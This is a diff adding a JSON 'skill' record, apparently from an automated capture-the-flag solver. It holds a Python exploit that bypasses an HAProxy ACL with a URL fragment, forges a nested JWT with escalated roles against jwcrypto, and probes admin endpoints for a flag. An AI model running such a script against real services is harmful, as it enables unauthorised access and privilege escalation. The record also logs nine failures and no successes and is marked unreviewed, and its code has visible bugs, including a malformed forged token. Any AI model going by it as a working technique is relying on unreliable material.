@@ -1,0 +1,24 @@
+{
+  "id": "skill-jwt-tamper-d98e3e2fbffe731f",
+  "success_count": 0,
+  "fail_count": 9,
+  "created": "2026-07-10T04:00:17Z",
+  "name": "jwcrypto-nested-bypass",
+  "description": "绕过HAProxy ACL并利用jwcrypto 1.5.6嵌套JWT漏洞提权",
+  "vuln_class": "jwt-tamper",
+  "signature": [
+    "acl",
+    "bypass",
+    "fragment",
+    "haproxy",
+    "jwcrypto",
+    "jwt",
+    "nested",
+    "privilege-escalation"
+  ],
+  "code": "def solve(base_url, session):\n    import re\n    import json\n    import base64\n    \n    def b64url_encode(data):\n        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()\n    \n    def b64url_decode(data):\n        if isinstance(data, str):\n            data = data.encode()\n        data = data + b'=' * (4 - len(data) % 4) if len(data) % 4 else data\n        return base64.urlsafe_b64decode(data)\n    \n    # Step 1: Bypass ACL using fragment (#) - path extracted from haproxy config pattern\n    # The ACL usually blocks some path like /api/v1/get_ticket\n    # We need to find the blocked path from response or use common pattern\n    # Try to get ticket via fragment bypass\n    r = tcp()\n    # Try common blocked paths\n    blocked_paths = ['/api/v1/get_ticket', '/api/v1/ticket', '/get_ticket', '/ticket']\n    \n    for path in blocked_paths:\n        try:\n            r = tcp()\n            request = f\"GET {path}# HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: close\\r\\n\\r\\n\"\n            r.send(request.encode())\n            response = r.recvall().decode('utf-8', errors='ignore')\n            \n            # Look for JWT token in response\n            json_match = re.search(r'\\{.*\\}', response, re.DOTALL)\n            if json_match:\n                ticket_data = json.loads(json_match.group())\n                \n                # Try to find token in response\n                for key in ['ticket', 'token', 'jwt', 'access_token']:\n                    if key in ticket_data:\n                        guest_token = ticket_data[key]\n                        break\n                else:\n                    # Check if any key contains 'ticket' or 'token'\n                    for key in ticket_data:\n                        if 'ticket' in key.lower() or 'token' in key.lower():\n                            guest_token = ticket_data[key]\n                            break\n                    else:\n                        continue\n                \n                if not guest_token:\n                    continue\n                    \n                # Step 2: Exploit jwcrypto nested JWT vulnerability\n                parts = guest_token.split('.')\n                if len(parts) != 3:\n                    continue\n                    \n                header, payload, signature = parts\n                parsed_payload = json.loads(b64url_decode(payload))\n                \n                # Look for role/permission fields to escalate\n                role_fields = ['role', 'admin', 'permission', 'level', 'type', 'user_type']\n                for field in role_fields:\n                    if field in parsed_payload:\n                        parsed_payload[field] = 'administrator' if 'admin' in str(parsed_payload[field]).lower() else 'admin'\n                        break\n                else:\n                    # Try common role patterns\n                    for key in parsed_payload:\n                        if any(role in key.lower() for role in ['role', 'perm', 'level', 'type']):\n                            parsed_payload[key] = 'administrator'\n                            break\n                \n                fake_payload = b64url_encode(json.dumps(parsed_payload, separators=(',', ':')).encode())\n                \n                # Create nested JWT structure\n                admin_token = '{\" ' + header + '.' + fake_payload + '.\"\":\"\",\"protected\":\"' + header + '\", \"payload\":\"' + payload + '\",\"signature\":\"' + signature + '\"}'\n                \n                # Step 3: Find flag endpoint\n                flag_endpoints = ['/api/v1/flag', '/api/v1/secret', '/flag', '/admin/flag', '/admin/secret']\n                \n                for flag_path in flag_endpoints:\n                    try:\n                        resp = http('GET', flag_path, headers={'Authorization': admin_token})\n                        \n                        if resp.status_code == 200:\n                            # Extract flag pattern\n                            flag_pattern = r'[A-Za-z0-9_]+\\{[^}]+\\}'\n                            flag_match = re.search(flag_pattern, resp.text)\n                            if flag_match:\n                                return flag_match.group()\n                    except:\n                        continue\n                        \n        except:\n            continue\n    \n    return None",
+  "provenance": {
+    "from": "http://127.0.0.1:1337",
+    "reviewed": false
+  }
+}
